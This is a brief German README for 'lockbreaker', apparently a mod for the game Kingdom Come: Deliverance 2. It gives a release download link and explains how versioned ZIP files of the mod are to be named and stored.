# lockbreaker

[Release herunterladen](https://github.com/Virtunerd/Kingdom-Come-Deliverance-2/releases/download/kcd2/lockbreaker.zip)

Lege ZIP-Versionen dieses Mods in diesem Ordner ab. Verwende das Format `lockbreaker-<Version>.zip`; die Versionsnummer muss mit `mod.manifest` in der ZIP übereinstimmen.

Beispiele: `lockbreaker-1.0.0.zip`, `lockbreaker-1.0.1.zip`, `lockbreaker-1.0.2.zip`.
